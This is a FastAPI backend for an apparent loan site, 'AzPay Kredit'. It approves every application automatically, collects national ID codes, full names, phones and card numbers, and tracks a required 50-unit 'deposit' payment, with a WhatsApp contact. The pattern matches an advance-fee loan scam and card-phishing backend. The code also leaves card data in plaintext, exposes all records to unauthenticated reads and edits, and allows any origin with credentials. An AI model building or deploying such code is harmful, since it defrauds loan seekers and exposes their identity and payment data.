from fastapi import FastAPI, APIRouter, HTTPException
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
from pathlib import Path
from pydantic import BaseModel, Field, ConfigDict
from typing import Optional
import uuid
from datetime import datetime, timezone


ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Create the main app without a prefix
app = FastAPI()

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")

# Define Models
class CreditApplication(BaseModel):
    model_config = ConfigDict(extra="ignore")
    
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    fin_code: str
    id_series: str
    full_name: str
    phone: str
    selected_amount: Optional[int] = None
    card_number: Optional[str] = None
    contract_signed: bool = False
    deposit_paid: bool = False
    status: str = "pending"
    created_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))

class CreditApplicationCreate(BaseModel):
    fin_code: str
    id_series: str
    full_name: str
    phone: str

class CreditApplicationUpdate(BaseModel):
    selected_amount: Optional[int] = None
    card_number: Optional[str] = None
    contract_signed: Optional[bool] = None
    deposit_paid: Optional[bool] = None
    status: Optional[str] = None

# Hardcoded Settings - No admin modification possible
SITE_SETTINGS = {
    "id": "settings",
    "deposit_amount": 50.0,
    "whatsapp_link": "https://wa.me/994506490600",
    "whatsapp_message_enabled": True,
    "logo_url": "https://i.hizliresim.com/iydskgy.jpeg",
    "hero_image_url": "https://i.hizliresim.com/iydskgy.jpeg",
    "approval_image_url": "https://i.hizliresim.com/iydskgy.jpeg",
    "credit_selection_image_url": "https://i.hizliresim.com/iydskgy.jpeg",
    "card_entry_image_url": "https://i.hizliresim.com/iydskgy.jpeg",
    "contract_image_url": "https://i.hizliresim.com/iydskgy.jpeg",
    "contact_phone": "+994 50 999 88 77",
    "contact_email": "info@azpay.az",
    "contact_address": "Bakı, Azərbaycan",
    "about_text": "AzPay Kredit müasir maliyyə həlləri təqdim edən etibarlı ödəniş və kredit platformasıdır."
}

# CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@api_router.get("/")
async def root():
    return {"message": "AzPay Kredit Sistemi API"}

# Credit Application Routes
@api_router.post("/applications", response_model=CreditApplication)
async def create_application(input: CreditApplicationCreate):
    app_dict = input.model_dump()
    app_obj = CreditApplication(**app_dict)
    app_obj.status = "approved"
    
    doc = app_obj.model_dump()
    doc['created_at'] = doc['created_at'].isoformat()
    
    await db.applications.insert_one(doc)
    return app_obj

@api_router.get("/applications/{app_id}")
async def get_application(app_id: str):
    app = await db.applications.find_one({"id": app_id}, {"_id": 0})
    if not app:
        raise HTTPException(status_code=404, detail="Müraciət tapılmadı")
    return app

@api_router.put("/applications/{app_id}")
async def update_application(app_id: str, update: CreditApplicationUpdate):
    update_data = {k: v for k, v in update.model_dump().items() if v is not None}
    
    if not update_data:
        raise HTTPException(status_code=400, detail="Yeniləmə məlumatı yoxdur")
    
    result = await db.applications.update_one(
        {"id": app_id},
        {"$set": update_data}
    )
    
    if result.matched_count == 0:
        raise HTTPException(status_code=404, detail="Müraciət tapılmadı")
    
    updated_app = await db.applications.find_one({"id": app_id}, {"_id": 0})
    return updated_app

# Settings Route - Read Only (Hardcoded)
@api_router.get("/settings")
async def get_settings():
    return SITE_SETTINGS

# Include the router in the main app
app.include_router(api_router)

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8001)
